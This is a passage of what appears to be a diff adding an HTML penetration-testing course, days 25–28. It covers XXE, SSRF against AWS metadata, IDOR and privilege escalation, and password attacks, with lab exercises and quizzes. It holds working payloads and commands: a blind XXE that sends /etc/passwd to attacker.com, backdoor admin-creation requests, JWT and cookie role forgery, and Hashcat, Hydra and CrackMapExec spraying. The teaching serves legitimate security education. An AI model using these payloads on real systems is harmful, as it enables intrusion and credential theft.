+<span class="co"># XXE makes the server fetch an internal URL — same impact as SSRF</span>
+
+<span class="co"># ── BLIND XXE (out-of-band data exfiltration) ─────────────────</span>
+<span class="ha">&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'https://attacker.com/?d=%file;'&gt;"&gt;
+&amp;eval;
+&amp;exfil;</span>
+<span class="co"># Server makes request to attacker.com with /etc/passwd as URL param
+# Attacker reads logs: GET /?d=root:x:0:0:root:/root:/bin/bash...</span>
+
+<span class="co"># ── FIX: Disable external entities in your XML parser ─────────</span>
+<span class="hg"># Java: factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)</span>
+<span class="hg"># Python: defusedxml library instead of standard xml.etree.ElementTree</span>
+<span class="hg"># PHP: libxml_disable_entity_loader(true) (before PHP 8.0)</span></div>
+  </div>
+
+  <div class="slbl">// DAY 25 — QUIZ</div>
+  <div class="qb">
+    <div class="qt">A web app on AWS allows users to input a URL to "preview" an image from the internet. You input <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code> and the app returns <code>EC2-WebServer-Role</code>. What is your next step and what is the realistic worst-case impact?</div>
+    <div class="qopts">
+      <div class="qo" onclick="qa(this,'wrong','The hostname is interesting but less valuable than the actual credentials. You\'ve already confirmed SSRF works — go directly for the credentials.')"><span class="qk">A</span> Fetch the instance hostname to identify the specific server model</div>
+      <div class="qo" onclick="qa(this,'wrong','Reporting immediately at this stage means not fully demonstrating impact. You should at minimum fetch the credentials URL to show what\'s accessible — that\'s the proof-of-concept the report needs.')"><span class="qk">B</span> Stop and report immediately — you\'ve proven SSRF exists</div>
+      <div class="qo" onclick="qa(this,'correct','Correct! Fetch: http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-WebServer-Role — this returns live AWS credentials (AccessKeyId, SecretAccessKey, SessionToken). With these you can: use aws-cli as the EC2 role, access any S3 bucket the role can reach (often includes backups with PII, code repos, logs), query RDS databases, invoke Lambda functions, and potentially escalate to admin via IAM privilege escalation. Worst case: complete AWS account compromise — all data, all services. This is CVSS 10.0 Critical. The Capital One 2019 breach used exactly this attack path — SSRF to EC2 metadata → IAM credentials → 100M customer records from S3.')"><span class="qk">C</span> Fetch the full credentials URL for EC2-WebServer-Role, use the returned AWS keys with aws-cli to enumerate accessible S3 buckets, RDS, and IAM permissions</div>
+      <div class="qo" onclick="qa(this,'wrong','Scanning internal IPs is also valid SSRF exploitation but the metadata endpoint is far more impactful — it gives you cloud credentials, not just network topology.')"><span class="qk">D</span> Use the SSRF to scan the internal IP range (10.x.x.x) for open ports</div>
+    </div>
+    <div class="qfb" id="q3"></div>
+  </div>
+</div><!-- /p3 -->
+
+
+<!-- ═════════════════ DAY 26 ═════════════════ -->
+<div class="pnl" id="p4">
+  <div class="dh">
+    <div class="dnum">26</div>
+    <div class="dinfo">
+      <h2>IDOR & BROKEN ACCESS CONTROL</h2>
+      <p><span class="stag sth">THEORY</span><span class="stag slb">LAB</span> OWASP Top 10 · Horizontal / Vertical Privilege Escalation · API Security</p>
+    </div>
+  </div>
+  <div class="pb"><div class="pbl">WEEK 4 PROGRESS — DAY 26 OF 28</div><div class="pbt"><div class="pbf" style="width:92%"></div></div></div>
+
+  <div class="note ni">
+    <div class="nico">🚪</div>
+    <p><strong>Broken Access Control is OWASP #1 — the most common critical web vulnerability.</strong> 94% of tested applications had some form of broken access control. It's not about technical complexity — it's about the server trusting the client to police itself. Access control must be enforced server-side on every request. Client-side enforcement (hiding buttons, greying out fields) is purely cosmetic — Burp Suite ignores it entirely.</p>
+  </div>
+
+  <div class="slbl">// 26.1 — THE OWASP TOP 10 (2021)</div>
+  <div class="owasp-list">
+    <div class="ow-item"><div class="ow-rank">1</div><div><div class="ow-name">Broken Access Control</div><div class="ow-sub">IDOR, privilege escalation, forced browsing, missing function-level auth</div></div><div class="ow-sev sev-c">CRITICAL</div></div>
+    <div class="ow-item"><div class="ow-rank">2</div><div><div class="ow-name">Cryptographic Failures</div><div class="ow-sub">Weak encryption, sensitive data in clear, MD5 passwords, no HTTPS</div></div><div class="ow-sev sev-c">CRITICAL</div></div>
+    <div class="ow-item"><div class="ow-rank">3</div><div><div class="ow-name">Injection</div><div class="ow-sub">SQL, NoSQL, OS command, LDAP injection — attacker controls query/command</div></div><div class="ow-sev sev-c">CRITICAL</div></div>
+    <div class="ow-item"><div class="ow-rank">4</div><div><div class="ow-name">Insecure Design</div><div class="ow-sub">Architectural flaws — threat modeling, missing rate limiting, insecure defaults</div></div><div class="ow-sev sev-h">HIGH</div></div>
+    <div class="ow-item"><div class="ow-rank">5</div><div><div class="ow-name">Security Misconfiguration</div><div class="ow-sub">Default credentials, unnecessary features enabled, verbose errors, unpatched systems</div></div><div class="ow-sev sev-h">HIGH</div></div>
+    <div class="ow-item"><div class="ow-rank">6</div><div><div class="ow-name">Vulnerable Components</div><div class="ow-sub">Using libraries/frameworks with known CVEs — Log4j, Spring4Shell</div></div><div class="ow-sev sev-h">HIGH</div></div>
+    <div class="ow-item"><div class="ow-rank">7</div><div><div class="ow-name">Auth & Session Failures</div><div class="ow-sub">Weak passwords, insecure session tokens, credential exposure, no MFA</div></div><div class="ow-sev sev-h">HIGH</div></div>
+    <div class="ow-item"><div class="ow-rank">8</div><div><div class="ow-name">Software & Data Integrity</div><div class="ow-sub">Unsigned updates, insecure CI/CD pipelines, deserialization attacks</div></div><div class="ow-sev sev-m">MEDIUM</div></div>
+    <div class="ow-item"><div class="ow-rank">9</div><div><div class="ow-name">Security Logging Failures</div><div class="ow-sub">No breach detection, insufficient monitoring, missing audit logs</div></div><div class="ow-sev sev-m">MEDIUM</div></div>
+    <div class="ow-item"><div class="ow-rank">10</div><div><div class="ow-name">SSRF</div><div class="ow-sub">Server-side request forgery — internal resource access via server proxy</div></div><div class="ow-sev sev-h">HIGH</div></div>
+  </div>
+
+  <div class="slbl">// 26.2 — IDOR: INSECURE DIRECT OBJECT REFERENCE</div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">IDOR — TESTING METHODOLOGY IN BURP</div></div>
+    <div class="tbody"><span class="co"># ── STEP 1: Create two accounts (attacker + victim) ──────────
+# Log in as attacker (user ID 1042)
+# Find requests that reference your own resource:</span>
+
+GET /api/users/<span class="ha">1042</span>/profile HTTP/1.1
+GET /api/orders/<span class="ha">7891</span> HTTP/1.1
+GET /api/documents/<span class="ha">DOC-4521</span>/download HTTP/1.1
+
+<span class="co"># ── STEP 2: In Burp Repeater, change ID to victim's ──────────</span>
+GET /api/users/<span class="ha">1043</span>/profile HTTP/1.1     <span class="co">← victim's user ID</span>
+<span class="ht">{"id":1043,"name":"Jane Doe","email":"jane@corp.com","ssn":"123-45-6789"}</span>
+<span class="ha"># You have Jane's SSN. IDOR confirmed. CVSS 8.6 — High.</span>
+
+<span class="co"># ── STEP 3: Check all HTTP methods ───────────────────────────</span>
+DELETE /api/orders/<span class="ha">7892</span> HTTP/1.1      <span class="co">← can you delete someone else's order?</span>
+PUT /api/users/<span class="ha">1043</span>/role HTTP/1.1     <span class="co">← can you change someone's role to admin?</span>
+<span class="cm">{"role": "admin"}</span>
+
+<span class="co"># ── STEP 4: Automate with Burp Intruder ──────────────────────
+# Send to Intruder → mark ID as payload position → attack type: Sniper
+# Payload: Numbers, range 1000-9999, step 1
+# Run → 200 responses with different body sizes = IDOR on every user account
+# Filter: Responses → Status=200 → grep for "email" or "ssn"</span>
+
+<span class="co"># ── NON-NUMERIC IDOR (GUIDs/hashes are still guessable) ──────</span>
+GET /api/files/<span class="ha">abc123def456</span>/download
+<span class="co"># Try other file IDs found in page source, API responses, error messages
+# Or enumerate via wordlist in Intruder if the namespace is guessable</span></div>
+  </div>
+
+  <div class="slbl">// 26.3 — VERTICAL PRIVILEGE ESCALATION</div>
+  <div class="card">
+    <div class="clbl">FORCING ACCESS TO HIGHER-PRIVILEGE FUNCTIONS</div>
+    <p>IDOR is <span class="ha2">horizontal</span> privilege escalation — accessing another user's resources at the same privilege level. <span class="hl">Vertical</span> escalation accesses functions that require higher privilege (admin functions, management APIs) by bypassing the access check — not by stealing credentials.</p>
+  </div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">VERTICAL PRIVESC — TESTING IN BURP</div></div>
+    <div class="tbody"><span class="co"># Admin panel hidden from standard users — but accessible if you know the URL:</span>
+GET <span class="ha">/admin/users</span> HTTP/1.1           <span class="co">← forced browsing to admin URL</span>
+<span class="ht">HTTP/1.1 200 OK    ← no redirect to login = broken vertical access control</span>
+
+<span class="co"># API endpoint only checks UI, not server-side:</span>
+POST /api/admin/create-user HTTP/1.1
+<span class="cm">{"username":"backdoor","password":"hacked","role":"admin"}</span>
+<span class="ht">HTTP/1.1 201 Created    ← admin account created by standard user!</span>
+
+<span class="co"># Role stored in JWT — no server-side validation:</span>
+<span class="co"># Decode JWT: {"sub":"user123","role":"user","exp":1234567890}
+# Modify:     {"sub":"user123","role":"admin","exp":1234567890}
+# If JWT uses "alg":"none" or weak secret → forge admin token</span>
+
+<span class="co"># Cookie with role in client-side storage (Burp shows in request):</span>
+Cookie: role=<span class="ha">user</span>; session=abc123
+<span class="co"># Modify to:</span>
+Cookie: role=<span class="ha">admin</span>; session=abc123
+<span class="ht">→ Response now shows admin dashboard    ← server trusted the client-side role</span></div>
+  </div>
+
+  <div class="slbl">// DAY 26 — QUIZ</div>
+  <div class="qb">
+    <div class="qt">You're testing a REST API. As a regular user, you send <code>GET /api/v1/admin/users</code> and receive a 200 with a list of all 50,000 users including hashed passwords. The front-end doesn't show an "Admin" menu to regular users. What is the vulnerability and why did hiding the menu fail as a security control?</div>
+    <div class="qopts">
+      <div class="qo" onclick="qa(this,'wrong','SQL Injection would involve injecting SQL syntax into parameters. Simply requesting an admin endpoint URL with no injection is a different vulnerability class entirely.')"><span class="qk">A</span> SQL Injection — the database returned too many records</div>
+      <div class="qo" onclick="qa(this,'wrong','SSRF involves the server making requests on your behalf to internal resources. Directly accessing an admin API endpoint is a client-to-server access control failure.')"><span class="qk">B</span> SSRF — you made the server access internal admin resources</div>
+      <div class="qo" onclick="qa(this,'correct','Correct! Broken Access Control — specifically "Forced Browsing" (a form of vertical privilege escalation). The admin menu was hidden in the UI but the underlying API endpoint had no server-side authorization check. This is the fundamental lesson: security cannot live in the UI. Burp Suite bypasses the browser entirely — any request the browser could make, Burp can also make, with any modification. The server must verify on every request: "Does this authenticated user have permission to perform this action?" — not "Did the front-end UI show them this button?" Front-end hiding is a UX feature, not a security feature.')"><span class="qk">C</span> Broken Access Control (forced browsing) — hiding the menu is UI-only; the server never checked if the requesting user had admin privileges</div>
+      <div class="qo" onclick="qa(this,'wrong','Information disclosure is a category but it\'s the consequence, not the root cause. The root vulnerability is missing server-side authorization — the disclosure is its impact.')"><span class="qk">D</span> Information Disclosure — the API shouldn\'t return password hashes</div>
+    </div>
+    <div class="qfb" id="q4"></div>
+  </div>
+</div><!-- /p4 -->
+
+
+<!-- ═════════════════ DAY 27 ═════════════════ -->
+<div class="pnl" id="p5">
+  <div class="dh">
+    <div class="dnum">27</div>
+    <div class="dinfo">
+      <h2>PASSWORD ATTACKS</h2>
+      <p><span class="stag stl">TOOL</span><span class="stag slb">LAB</span> Hashcat · John the Ripper · Credential Stuffing · Password Spraying</p>
+    </div>
+  </div>
+  <div class="pb"><div class="pbl">WEEK 4 PROGRESS — DAY 27 OF 28</div><div class="pbt"><div class="pbf" style="width:96%"></div></div></div>
+
+  <div class="note ni">
+    <div class="nico">🔑</div>
+    <p><strong>Password attacks are the most common initial access vector.</strong> 80%+ of breaches involve credential compromise. Weak passwords, reused passwords, and credential dumps from other breaches are your primary inputs. The art is in choosing the right attack mode — brute-forcing 8-char bcrypt is computationally futile, but smart dictionary + rule attacks crack 60–80% of real-world MD5/NTLM hashes in minutes.</p>
+  </div>
+
+  <div class="slbl">// 27.1 — HASH CRACKING SPEED REALITY CHECK</div>
+  <div class="crack-meter">
+    <h4>⚡ GPU CRACKING SPEEDS — RTX 4090 (Single GPU)</h4>
+    <div class="crack-rows">
+      <div class="crack-row">
+        <div class="cr-label">MD5 — 8 chars</div>
+        <div class="cr-bar-wrap"><div class="cr-bar bar-instant"></div></div>
+        <div class="cr-time t-instant">Seconds</div>
+      </div>
+      <div class="crack-row">
+        <div class="cr-label">NTLM — 8 chars</div>
+        <div class="cr-bar-wrap"><div class="cr-bar bar-instant"></div></div>
+        <div class="cr-time t-instant">Under 1 sec</div>
+      </div>
+      <div class="crack-row">
+        <div class="cr-label">SHA-256 — 8 chars</div>
+        <div class="cr-bar-wrap"><div class="cr-bar bar-sec"></div></div>
+        <div class="cr-time t-sec">~2 minutes</div>
+      </div>
+      <div class="crack-row">
+        <div class="cr-label">SHA-512 — 8 chars</div>
+        <div class="cr-bar-wrap"><div class="cr-bar bar-min"></div></div>
+        <div class="cr-time t-min">~30 minutes</div>
+      </div>
+      <div class="crack-row">
+        <div class="cr-label">bcrypt (cost 12) — 8 chars</div>
+        <div class="cr-bar-wrap"><div class="cr-bar bar-yrs"></div></div>
+        <div class="cr-time t-yrs">~6 years</div>
+      </div>
+      <div class="crack-row">
+        <div class="cr-label">Argon2id — 8 chars</div>
+        <div class="cr-bar-wrap"><div class="cr-bar bar-imp"></div></div>
+        <div class="cr-time t-imp">Centuries</div>
+      </div>
+    </div>
+    <p style="font-size:0.78rem;color:var(--muted);margin-top:1rem;">* Full random 8-char printable ASCII bruteforce (~7 trillion combinations). Real passwords from wordlists crack much faster — rockyou.txt (14M passwords) runs in under 1 second on MD5.</p>
+  </div>
+
+  <div class="slbl">// 27.2 — IDENTIFYING HASH TYPES</div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">HASH IDENTIFICATION</div></div>
+    <div class="tbody"><span class="co"># Hash examples with their type and Hashcat mode (-m):</span>
+
+<span class="ha">5f4dcc3b5aa765d61d8327deb882cf99</span>          <span class="co">← MD5 (-m 0) — 32 hex chars</span>
+<span class="ha">5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8</span>  <span class="co">← SHA-1 (-m 100) — 40 hex chars</span>
+<span class="ha">ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f</span>  <span class="co">← SHA-256 (-m 1400)</span>
+<span class="ha">aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c</span>  <span class="co">← NTLM (-m 1000)</span>
+<span class="ha">$2b$12$EXRkfkdmXn2gzds2SSitu.MW9.TNTiDPa2tO4vMYp4aQ3QPAB3gu6</span>   <span class="co">← bcrypt (-m 3200)</span>
+<span class="ha">$1$nUP0OmFM$Hc6sSkyq3q0oVnwMfCvGY/</span>          <span class="co">← MD5crypt (-m 500) — Linux /etc/shadow</span>
+<span class="ha">$6$rounds=5000$...</span>                            <span class="co">← SHA-512crypt (-m 1800) — modern Linux</span>
+
+<span class="co"># Auto-identification:</span>
+<span class="pr">$</span> <span class="cm">hashid 5f4dcc3b5aa765d61d8327deb882cf99</span>
+<span class="ht">Analyzing '5f4dcc3b5aa765d61d8327deb882cf99'
+[+] MD2 [Hashcat Mode: 9000]
+[+] MD5 [Hashcat Mode: 0]        ← most likely for 32-char hex
+[+] MD4 [Hashcat Mode: 900]</span>
+
+<span class="pr">$</span> <span class="cm">hashcat --identify 5f4dcc3b5aa765d61d8327deb882cf99</span>
+<span class="ht">The following hash-mode match the structure of the input hash:
+      # | Name                                                       | Category
+  ======+============================================================+==========
+      0 | MD5                                                        | Raw Hash</span></div>
+  </div>
+
+  <div class="slbl">// 27.3 — HASHCAT ATTACK MODES DEEP DIVE</div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">HASHCAT — ALL ATTACK MODES WITH REAL EXAMPLES</div></div>
+    <div class="tbody"><span class="co"># ── MODE 0: STRAIGHT (Wordlist) ──────────────────────────────
+# Try every word in the wordlist as-is. Fast. Best first attempt.</span>
+<span class="pr">$</span> <span class="cm">hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt</span>
+<span class="co"># Cracks ~40% of real MD5 hashes from rockyou.txt in under 1 second</span>
+
+<span class="co"># ── MODE 0 + RULES (Wordlist + Mangling Rules) ────────────────
+# Apply transformation rules: Capitalize, add numbers, l33tspeak, append symbols
+# Expands rockyou.txt (14M) into billions of variants</span>
+<span class="pr">$</span> <span class="cm">hashcat -m 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule</span>
+<span class="co"># best64.rule = 64 most effective rules: Password → P@ssw0rd, password1, PASSWORD!</span>
+<span class="pr">$</span> <span class="cm">hashcat -m 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule</span>
+<span class="co"># OneRule = 52k rules combined — cracks ~90% of real-world hashes with rockyou</span>
+
+<span class="co"># ── MODE 3: BRUTE FORCE (Mask Attack) ───────────────────────
+# Define character sets with masks: ?l=lowercase ?u=upper ?d=digit ?s=special ?a=all
+# Pattern-based — if you know password structure</span>
+<span class="pr">$</span> <span class="cm">hashcat -m 0 hashes.txt -a 3 ?u?l?l?l?l?d?d?d?d</span>  <span class="co"># Matches: Password1234</span>
+<span class="pr">$</span> <span class="cm">hashcat -m 0 hashes.txt -a 3 ?a?a?a?a?a?a?a?a</span>    <span class="co"># All 8-char combos</span>
+<span class="pr">$</span> <span class="cm">hashcat -m 0 hashes.txt -a 3 Company?d?d?d?d</span>      <span class="co"># Company1234, Company2023...</span>
+
+<span class="co"># ── MODE 1: COMBINATION ──────────────────────────────────────</span>
+<span class="pr">$</span> <span class="cm">hashcat -m 0 hashes.txt -a 1 words1.txt words2.txt</span>
+<span class="co"># Combines every word from list1 with every word from list2
+# dragon + ball = dragonball, blue + sky = bluesky</span>
+
+<span class="co"># ── MODE 6/7: HYBRID ─────────────────────────────────────────</span>
+<span class="pr">$</span> <span class="cm">hashcat -m 0 hashes.txt -a 6 rockyou.txt ?d?d?d?d</span>
+<span class="co"># Word from list + mask suffix: password → password1234, password2024</span>
+
+<span class="co"># ── WINDOWS NTLM HASHES (from Mimikatz/hashdump) ─────────────</span>
+<span class="pr">$</span> <span class="cm">hashcat -m 1000 ntlm_hashes.txt rockyou.txt -r OneRuleToRuleThemAll.rule</span>
+<span class="ht"># NTLM is FAST: 289 billion hashes/sec. 8-char NTLM cracks in milliseconds.</span>
+
+<span class="co"># ── MONITOR PROGRESS ─────────────────────────────────────────
+# Press 's' during run to see status
+# Results saved to hashcat.potfile automatically</span>
+<span class="pr">$</span> <span class="cm">hashcat -m 0 hashes.txt --show</span>  <span class="co"># Show already-cracked hashes</span></div>
+  </div>
+
+  <div class="slbl">// 27.4 — NETWORK-BASED PASSWORD ATTACKS</div>
+  <table class="tbl">
+    <tr><th>ATTACK TYPE</th><th>WHAT IT IS</th><th>TOOL</th><th>DETECTION RISK</th></tr>
+    <tr>
+      <td><span class="hl">Brute Force</span></td>
+      <td>Try ALL possible password combinations against a login. Exhaustive.</td>
+      <td>Hydra, Medusa, Burp Intruder</td>
+      <td><span class="hl">Very High</span> — triggers lockout and IDS immediately</td>
+    </tr>
+    <tr>
+      <td><span class="ha2">Dictionary Attack</span></td>
+      <td>Try a wordlist of likely passwords. Faster, smarter than brute force.</td>
+      <td>Hydra: <code>-P rockyou.txt</code></td>
+      <td><span class="ha2">High</span> — many failed attempts per user</td>
+    </tr>
+    <tr>
+      <td><span class="ht2">Password Spraying</span></td>
+      <td>Try ONE common password (e.g., "Spring2024!") against MANY users. Avoids lockout per-account.</td>
+      <td>CrackMapExec, Ruler, Spray</td>
+      <td><span class="ht2">Low</span> — 1 attempt per user, below lockout threshold</td>
+    </tr>
+    <tr>
+      <td><span class="hb2">Credential Stuffing</span></td>
+      <td>Try username:password pairs from previous data breaches. Password reuse is ~65%.</td>
+      <td>Snipr, Sentry MBA, custom scripts</td>
+      <td><span class="ht2">Low–Medium</span> — valid credentials = looks like real login</td>
+    </tr>
+  </table>
+
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">HYDRA — NETWORK LOGIN BRUTE FORCE</div></div>
+    <div class="tbody"><span class="co"># SSH brute force (use with caution — creates log entries)</span>
+<span class="pr">$</span> <span class="cm">hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt \
+  192.168.56.101 ssh -t 4</span>
+<span class="co"># -l = single username, -P = password list, -t = threads</span>
+
+<span class="co"># Web login form brute force (POST)</span>
+<span class="pr">$</span> <span class="cm">hydra -l admin -P rockyou.txt 192.168.56.101 \
+  http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"</span>
+<span class="co"># Format: "URL:POST_body:failure_string"
+# ^USER^ and ^PASS^ are replaced by hydra with each attempt</span>
+
+<span class="co"># Password spraying against SSH (one password, many users)</span>
+<span class="pr">$</span> <span class="cm">hydra -L users.txt -p 'Summer2024!' 192.168.56.101 ssh</span>
+
+<span class="co"># CrackMapExec — SMB password spraying (Active Directory)</span>
+<span class="pr">$</span> <span class="cm">crackmapexec smb 192.168.56.0/24 -u users.txt -p 'Password123' \
+  --continue-on-success</span>
+<span class="ht">[+] 192.168.56.102:445 CORP\john.smith:Password123 (Pwn3d!)</span>  <span class="ha">← shell access!</span></div>
+  </div>
+
+  <div class="slbl">// DAY 27 — QUIZ</div>
+  <div class="qb">
+    <div class="qt">You dump NTLM hashes from a Windows machine. One hash is <code>aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c</code>. Without running Hashcat, what can you tell from the first half of this hash, and what's the most efficient cracking approach for NTLM?</div>
+    <div class="qopts">
+      <div class="qo" onclick="qa(this,'wrong','The first half being all zeros/same value means no LM hash — that\'s different from a very weak password. An empty LM hash just means LM hashing is disabled (which is correct security practice).')"><span class="qk">A</span> The first half being repeated characters means the password is extremely short</div>
+      <div class="qo" onclick="qa(this,'correct','Correct! The first half (aad3b435b51404eeaad3b435b51404ee) is the "null" LM hash — it means the LM hash is either disabled or the password is over 14 characters (LM only works on first 14 chars). The second half (8846...) is the actual NTLM hash. 8846f7eaee8fb117ad06bdd830b7586c is an extremely well-known hash — it\'s the NTLM hash of "password". You can verify this by simply looking it up in any online hash database (crackstation.net, hashes.com) without even running Hashcat. This is called a rainbow table lookup. For efficient NTLM cracking: Step 1: lookup online (instant). Step 2: rockyou.txt wordlist (-m 1000) — cracks in seconds. Step 3: rockyou + OneRuleToRuleThemAll — cracks 80%+ of real hashes.')"><span class="qk">B</span> The first half is the null LM hash (LM disabled). The NTLM second half can be looked up in rainbow table databases instantly — 8846... is the hash of "password"</div>
+      <div class="qo" onclick="qa(this,'wrong','Both halves are parts of the same credential — the format is LMhash:NThash. The colon separates them. NTLM is the NT hash (second part), which is what you crack.')"><span class="qk">C</span> The colon separates two different users\' hashes that were concatenated</div>
+      <div class="qo" onclick="qa(this,'wrong','The format tells you nothing about password length — a 20-character password still produces a fixed-length hash. Hash length is always constant regardless of input length.')"><span class="qk">D</span> The length of each half tells you the approximate password character count</div>
+    </div>
+    <div class="qfb" id="q5"></div>
+  </div>
+</div><!-- /p5 -->
+
+
+<!-- ═════════════════ DAY 28 ═════════════════ -->
+<div class="pnl" id="p6">
+  <div class="dh">
+    <div class="dnum">28</div>
+    <div class="dinfo">
+      <h2>PHASE 2 CAPSTONE + CTF</h2>
+      <p><span class="stag slb">LAB</span> HackTheBox Machine · Full Attack Chain · Phase 2 Review · Phase 3 Preview</p>
+    </div>
+  </div>
+  <div class="pb"><div class="pbl">WEEK 4 — PHASE 2 COMPLETE ✓</div><div class="pbt"><div class="pbf" style="width:100%"></div></div></div>
+
+  <div class="note ng">
+    <div class="nico">🏆</div>
+    <p><strong>Phase 2 complete.</strong> You've gone from reconnaissance to full exploitation — Metasploit shells, SQL injection database dumps, XSS session theft, SSRF to cloud credentials, IDOR privilege escalation, and cracking real password hashes. Today you chain everything into a complete attack against a real HackTheBox machine.</p>
+  </div>
+
+  <div class="slbl">// 28.1 — THE COMPLETE ATTACK METHODOLOGY</div>
+  <div class="card">
+    <div class="clbl">PHASE 2 SKILLS — FULL ATTACK CHAIN</div>
+    <p>Everything you've learned follows a single methodology. Before touching Phase 3 (advanced exploitation), internalize this chain until it's automatic:</p>
+  </div>
+
+  <div class="msf-flow">
+    <div class="msf-step">
+      <div class="ms-n" style="background:var(--muted)">0</div>
+      <div class="ms-cmd">OSINT</div>
+      <div class="ms-desc">Passive recon — theHarvester, Google dorks, Shodan. Zero network contact with target.</div>
+    </div>
+    <div class="msf-step">
+      <div class="ms-n">1</div>
+      <div class="ms-cmd">nmap -sV -sC</div>
+      <div class="ms-desc">Active scanning — discover hosts, open ports, service versions. NSE scripts for quick vuln checks.</div>
+    </div>
+    <div class="msf-step">
+      <div class="ms-n">2</div>
+      <div class="ms-cmd">Enumerate</div>
+      <div class="ms-desc">Gobuster for web dirs, enum4linux for SMB, BloodHound for AD. Build complete attack surface map.</div>
+    </div>
+    <div class="msf-step">
+      <div class="ms-n">3</div>
+      <div class="ms-cmd">Identify vulns</div>
+      <div class="ms-desc">Match discovered versions to CVEs. OpenVAS/Nessus scan. Manual Burp testing on web apps.</div>
+    </div>
+    <div class="msf-step">
+      <div class="ms-n">4</div>
+      <div class="ms-cmd">Exploit</div>
+      <div class="ms-desc">Metasploit for known CVEs. Manual SQLi/XSS for web. Credential attacks for authentication.</div>
+    </div>
+    <div class="msf-step">
+      <div class="ms-n">5</div>
+      <div class="ms-cmd">Post-exploit</div>
+      <div class="ms-desc">Privilege escalation, credential harvesting, lateral movement, persistence. (Week 5–6 focus)</div>
+    </div>
+    <div class="msf-step">
+      <div class="ms-n">6</div>
+      <div class="ms-cmd">Document</div>
+      <div class="ms-desc">Evidence screenshots, command history, impact demonstration. Professional report = paid engagement.</div>
+    </div>
+  </div>
+
+  <div class="slbl">// 28.2 — PHASE 2 COMPLETE REVIEW TABLE</div>
+  <table class="tbl">
+    <tr><th>WEEK</th><th>DAY</th><th>SKILL MASTERED</th><th>TOOL</th></tr>
+    <tr><td rowspan="7">Week 3</td><td>15</td><td>Nmap all scan types, NSE scripts, timing templates</td><td>nmap</td></tr>
+    <tr><td>16</td><td>Directory/subdomain/parameter brute-force</td><td>Gobuster, ffuf, Nikto</td></tr>
+    <tr><td>17</td><td>Vulnerability scanning, CVSS triage</td><td>OpenVAS, Nessus</td></tr>
+    <tr><td>18</td><td>AD enumeration, BloodHound attack paths</td><td>BloodHound, enum4linux</td></tr>
+    <tr><td>19</td><td>HTTP methods, cookies, security headers</td><td>curl, DevTools</td></tr>
+    <tr><td>20</td><td>Burp Suite proxy, Repeater, manual testing</td><td>Burp Suite</td></tr>
+    <tr><td>21</td><td>HackTheBox: Meow, Fawn, Dancing, Redeemer</td><td>All of the above</td></tr>
+    <tr><td rowspan="7">Week 4</td><td>22</td><td>Metasploit: exploit, payload, Meterpreter</td><td>msfconsole, msfvenom</td></tr>
+    <tr><td>23</td><td>SQL injection: manual + automated + all types</td><td>Burp Suite, sqlmap</td></tr>
+    <tr><td>24</td><td>XSS: reflected, stored, DOM, cookie theft</td><td>Burp Suite, XSS Hunter</td></tr>
+    <tr><td>25</td><td>CSRF, SSRF (AWS meta), XXE file read</td><td>Burp Suite</td></tr>
+    <tr><td>26</td><td>IDOR, vertical privesc, OWASP Top 10</td><td>Burp Suite, Intruder</td></tr>
+    <tr><td>27</td><td>Hashcat all modes, Hydra, password spraying</td><td>Hashcat, Hydra, CME</td></tr>
+    <tr><td>28</td><td>Full attack chain HackTheBox machine</td><td>Everything</td></tr>
+  </table>
+
+  <div class="slbl">// 28.3 — CAPSTONE LABS</div>
+  <div class="card">
+    <div class="clbl">LAB 1 — HACKTHEBOX: COMPLETE EASY MACHINE (Choose One)</div>
+    <div class="note nw" style="margin-bottom:0.8rem">
+      <div class="nico">⚡</div>
+      <p><strong>No walkthrough mode.</strong> Attempt each step independently for 30 minutes before checking hints. The struggle is where you learn. Document EVERY command you run and why.</p>
+    </div>
+    <ul class="ck">
+      <li><strong>Lame</strong> — Classic easy Linux. Samba vulnerability + nmap → Metasploit. Good first machine.</li>
+      <li><strong>Jerry</strong> — Windows Tomcat. Web recon → default credentials → WAR file upload → shell.</li>
+      <li><strong>Bashed</strong> — Linux web server. Gobuster → find phpbash → user flag → privesc via sudo.</li>
+      <li><strong>Blue</strong> — Windows EternalBlue (MS17-010). nmap NSE confirms → Metasploit → SYSTEM shell.</li>
+    </ul>
+  </div>
+
+  <div class="card">
+    <div class="clbl">LAB 2 — PORTSWIGGER WEB ACADEMY (Complete All)</div>
+    <ul class="ck">
+      <li><strong>SQL Injection:</strong> "SQL injection vulnerability in WHERE clause" + "UNION attack extracting data from other tables"</li>
+      <li><strong>XSS:</strong> "Stored XSS into HTML context" + "DOM XSS in document.write sink using source location.search"</li>
+      <li><strong>CSRF:</strong> "CSRF vulnerability with no defenses" — build the CSRF PoC HTML and submit it</li>
+      <li><strong>SSRF:</strong> "Basic SSRF against the local server" + "SSRF with blacklist-based input filter" (bypass practice)</li>
+      <li><strong>Access Control:</strong> "Unprotected admin functionality" + "User ID controlled by request parameter"</li>
+    </ul>
+  </div>
+
+  <div class="card">
+    <div class="clbl">LAB 3 — CRACK THE METASPLOITABLE HASHES</div>
+    <ul class="ck">
+      <li>From Day 22: you dumped /etc/shadow from Metasploitable. Run hashid on each hash to identify the type.</li>
+      <li>Copy hashes to a file: <code>shadow_hashes.txt</code></li>
